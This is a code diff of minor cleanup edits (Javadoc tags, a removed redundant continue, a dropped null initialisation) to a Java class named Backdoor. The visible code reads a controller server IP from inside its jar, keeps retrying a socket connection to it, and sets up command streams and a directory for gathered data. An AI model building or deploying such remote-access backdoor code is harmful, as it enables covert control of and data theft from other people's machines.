@@ -29,7 +29,7 @@ public class Backdoor {
 	 * Uses {@link #readFromJar(String)} to get the contents of "ip", a text file
 	 * inside the jar file this class will be running from. This file contains the
 	 * IP address of the server to be used to control the backdoor. Sets {@link #ip}
-	 * to this address. Creates directory {@link gatheredDir}.
+	 * to this address. Creates directory {@code gatheredDir}.
 	 */
 	private Backdoor() {
 		try {
@@ -56,7 +56,6 @@ public class Backdoor {
 					break;
 				} catch (Exception e) {
 					Thread.sleep(3000);
-					continue;
 				}
 			in = new Scanner(socket.getInputStream());
 			out = new PrintWriter(socket.getOutputStream(), true);
@@ -80,14 +79,14 @@ public class Backdoor {
 	}
 
 	/**
-	 * Gets the contents of the file with the name {@link filename} from inside the
+	 * Gets the contents of the file with the name {@code filename} from inside the
 	 * jar file this class will be running from.
 	 * 
 	 * @param filename name of the file to get contents of
 	 * @return contents of the file
 	 */
 	private String readFromJar(String filename) {
-		String ret = null;
+		String ret;
 		Scanner in = new Scanner(getClass().getResourceAsStream(filename));
 		ret = in.nextLine();
 		in.close();
